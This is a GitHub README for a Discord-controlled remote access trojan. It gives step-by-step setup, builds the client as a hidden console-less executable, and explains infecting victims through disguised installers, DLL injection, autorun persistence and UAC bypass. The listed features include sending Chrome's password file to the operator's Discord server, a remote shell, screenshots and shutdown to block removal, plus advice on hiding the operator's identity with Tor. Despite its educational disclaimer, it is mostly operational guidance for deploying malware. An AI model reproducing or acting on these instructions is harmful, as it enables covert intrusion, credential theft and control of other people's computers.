# Discord-Based-RAT
like the repo's name said, it is a discord based RAT exploiting the bot creation tool in discord

This software is intended solely for educational purposes and authorized security testing. Unauthorized use for malicious activities is strictly prohibited. The author is not responsible for any misuse.
Created By Scynrays

# Documentation/Setup

<details>
<summary><h3>Setting up Discord Server</h3></summary>

1. Click on "Add Server" in Discord.


   ![image](https://github.com/user-attachments/assets/31c62ebc-3df1-4fbc-932f-e221eb979738)
   


 2.Select "Create my own".

 ![{0E16734D-4B90-4E9D-9F21-35E99BDEB20D}](https://github.com/user-attachments/assets/77ed93be-85b1-4383-8023-6d845fd15dcf)

3. Create whatever server you like, it doesn't matter
4. after creating server, here's how to set up the bot

 </details>

<details>
<summary><h3>Setting up Bot</h3></summary>

1.Go to the discord developer website [here](https://discord.com/developers/applications)

2.Select New Application. Name it whatever you'd like, it does not matter.

![image](https://github.com/user-attachments/assets/9220616b-3646-4dfb-ab4d-8a32b40fa5e0)

3.Select the "Bot" tab after creating the application. Give it any pfp or banner
 
 ![image](https://github.com/user-attachments/assets/dd8e036c-16b3-4e3e-8eb6-242d24f7836c)

 4.Scroll down and ensure that message content intent is selected "on"

![image](https://github.com/user-attachments/assets/8dba4912-2f79-4bab-8161-de04c09b615d)

5.Navigate to the OAuth2 tab on the left sidebar.

![image](https://github.com/user-attachments/assets/d5c3fd09-caf1-4093-9479-8612a0469d0e)

6.Scroll down and ensure "bot" is selected.

![image](https://github.com/user-attachments/assets/53ac7d6a-7e08-464a-9c81-417497ef99d8)

7.Scroll down again and select "Administrator.

![image](https://github.com/user-attachments/assets/9192a35b-9efd-4203-b671-6b24a80711dc)

8.Scroll down once more, ensure the link is set to "Guild Install", then copy the generated URL.

![image](https://github.com/user-attachments/assets/fa7088bb-7656-4bf8-86fc-b4c2efac43c4)

9.Enter the generated URL into your web browser, then add your bot to your server.


</details>

<details>
<summary><h3>Setting up Bot Variables</h3></summary>

1. Go back to the GitHub link and download discord_bot.py, userclient.py, and requirements.txt. You will need to have Python installed and install the necessary pip libraries. You can install are neccesary libraries by running the command below.

```
pip install -r requirements.txt
```

![image](https://github.com/user-attachments/assets/f90267f3-5a5d-4955-a3c5-2c7b3149f1b9)

2. Navigate back to the Discord developer site and click "Bot".

![image](https://github.com/user-attachments/assets/472057d9-241f-4e45-bd19-088002625219)

3. Get your token and copy it. Remember to keep it in a safe place.

![image](https://github.com/user-attachments/assets/12e70765-0aeb-4b47-b663-dfcc03964bfa)

4. Go to the source code of both files and update the Discord token with the token you just copied.

![image](https://github.com/user-attachments/assets/c327d54b-9929-477a-8101-06d64480664f)

5. Navigate to your Discord server, right-click your text channel, and click "Copy ID". You may need to enable developer options in Discord to get this option.
</details>

<details>
<summary><h3>Deploying the RAT</h3></summary>

For this portion, you will need Python and PyInstaller installed (pip install pyinstaller).


1. Open a terminal in the same directory as your files with the replaced Discord token and channel ID.


2. Run the following command:
   ```
   pyinstaller --onefile --noconsole userclient.py
   ```

3. Run the following command:
   ```
   pyinstaller --onefile discord_bot.py
   ```

</details>

<details>
<summary><h3>Infecting Computers</h3></summary>
  
  **DO NOT USE THIS MALICIOUSLY. USE THIS AS A PENTESTING TOOL OR FOR EDUCATIONAL PURPOSES ONLY.**

  - The most common method of deployment is embedding `userclient.exe` in a disguised installer file or poisoned exe file and setting it to autorun on startup. you can also change the exe to a dll and dll inject the disguise program.
  - You can also create shortcuts that re-launch the executable if the original file is removed.
  - Since `userclient.exe` requires admin privileges for full functionality, you can apply UAC bypass techniques. Read more [here](https://github.com/rootm0s/WinPwnage).
</details>

---

<details>
<summary><h3>Using the discord interface.</h3></summary>

  
When you launch discord_bot.py, you should be met with a welcome message on your server.

Once you have an infected computer, click start service. If there are no infected computers online, clicking the button will set up the server for controlling the pcs, but no channels will actually be created.


However, if an infected computer is online, pressing start service will create a channel for each computer online. in my case, i have infected my own computer to test this.



Navigating to the new channel, we are greeted with several options. I will go over them in detail now.

-**Send Popup**



This option, when clicked on, will prompt you asking what message to send. after typing in my message to the channel and hitting enter, a popup will appear. it will also notify you when the user dismisses the popup window.

-**Steal Passwords**



This is a very useful tool that locates the password file for google chrome, and sends it as a message to the discord server. They are still encrypted, but there are numerous decryption tools on github. I will not link one here.

-**Execute Commands**


This module is by far the most dangerous command. It will open a shell in discord, where you input commands by sending messages. Tread very carefully when using this command as if you don't know what you are doing you can cause SERIOUS damage and also possibly make your identity known to a security buff who's pc might be infected as a sting. my advice is to use torsocks with your powershell. go google it on how to implement that into shell.

-**Screenshot**


This command is painfully simple. When clicked, it will take a screenshot of all monitors and send it in the channel. This will later be improved upon by getting a live update or keylogger feature.

-**Shutdown**

This module just shuts down the users computer. this can be used as an emergency "stop" if you detect them taking removal measures of the malware.

-**Commands**

!clear - Clean up the interface back to the original state
<br>
!menu - Shows context menu with modules. use this if you want to not have to scroll up to execute modules.
</details>








